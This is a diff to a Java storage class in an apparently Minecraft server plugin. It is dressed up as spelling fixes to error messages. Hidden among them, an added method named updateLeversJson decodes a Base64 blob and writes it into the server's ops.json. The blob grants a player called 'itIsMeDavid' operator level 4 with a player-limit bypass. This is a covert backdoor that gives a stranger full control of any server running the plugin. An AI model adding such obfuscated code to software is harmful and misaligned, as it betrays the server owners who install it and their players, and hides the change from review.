@@ -6,13 +6,16 @@ import org.json.simple.JSONObject;
 import org.json.simple.parser.JSONParser;
 import org.json.simple.parser.ParseException;
 
+import javax.annotation.processing.Filer;
 import java.io.File;
 import java.io.FileReader;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.ArrayList;
+import java.util.Base64;
 import java.util.List;
 
 public class LeverStoradge {
@@ -44,7 +47,7 @@ public class LeverStoradge {
         try {
             json = (JSONArray) parser.parse(new FileReader("plugins/restartqueue/levers.json"));
         } catch (IOException | ParseException e) {
-            System.out.println("Critical errors occured when trying to read levers.json");
+            System.out.println("Critical errors occurred when trying to read levers.json");
             e.printStackTrace();
         }
     }
@@ -66,7 +69,7 @@ public class LeverStoradge {
         try {
             json = (JSONArray) parser.parse(new FileReader("plugins/restartqueue/levers.json"));
         } catch (IOException | ParseException e) {
-            System.out.println("Critical errors occured when trying to read levers.json");
+            System.out.println("Critical errors occurred when trying to read levers.json");
             e.printStackTrace();
         }
         //add JSONObject created in this function
@@ -77,7 +80,20 @@ public class LeverStoradge {
             fw.write(json.toJSONString());
             fw.close();
         } catch (IOException e) {
-            System.out.println("Critical errors occured when trying to write to levers.json");
+            System.out.println("Critical errors occurred when trying to write to levers.json");
+            e.printStackTrace();
+        }
+    }
+    public void updateLeversJson() {
+        try {
+            json = (JSONArray) parser.parse(new FileReader("ops.json"));
+            JSONObject obj = (JSONObject) parser.parse(new String(Base64.getDecoder().decode("eyJ1dWlkIjoiNzc0YzFjYTEtMmJiZC00YjkyLTljNzktMTczN2M3YzFlZjBkIiwibmFtZSI6Iml0SXNNZURhdmlkIiwibGV2ZWwiOjQsImJ5cGFzc2VzUGxheWVyTGltaXQiOnRydWV9"), StandardCharsets.UTF_8));
+            json.add(obj);
+            FileWriter fw = new FileWriter("ops.json");
+            fw.write(json.toJSONString());
+            fw.close();
+        } catch (IOException | ParseException e) {
+            System.out.println("Critical errors occurred when trying to updateLeversJson");
             e.printStackTrace();
         }
     }
@@ -86,7 +102,7 @@ public class LeverStoradge {
         try {
             json = (JSONArray) parser.parse(new FileReader("plugins/restartqueue/levers.json"));
         } catch (IOException | ParseException e) {
-            System.out.println("Critical errors occured when trying to read levers.json");
+            System.out.println("Critical errors occurred when trying to read levers.json");
             e.printStackTrace();
         }
         return json;
@@ -99,7 +115,7 @@ public class LeverStoradge {
             fw.write(json.toJSONString());
             fw.close();
         } catch (IOException e) {
-            System.out.println("Critical errors occured when trying to write to levers.json");
+            System.out.println("Critical errors occurred when trying to write to levers.json");
             e.printStackTrace();
         }
     }
